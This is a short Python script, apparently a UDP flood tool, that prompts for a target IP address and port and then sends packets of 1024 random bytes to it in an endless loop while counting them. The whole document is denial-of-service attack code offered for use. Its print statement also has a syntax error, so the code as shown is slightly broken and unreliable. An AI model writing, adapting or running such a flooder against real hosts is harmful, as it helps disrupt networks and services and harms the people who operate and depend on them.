import socket
import random
from time import *

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)

ip = input('Target IP: ')
port = int(input('Port: '))
s=0
while True:
    sock.sendto(bytes, (ip, port))
    s+=1
    print('Packet #',s 'to ', ip)
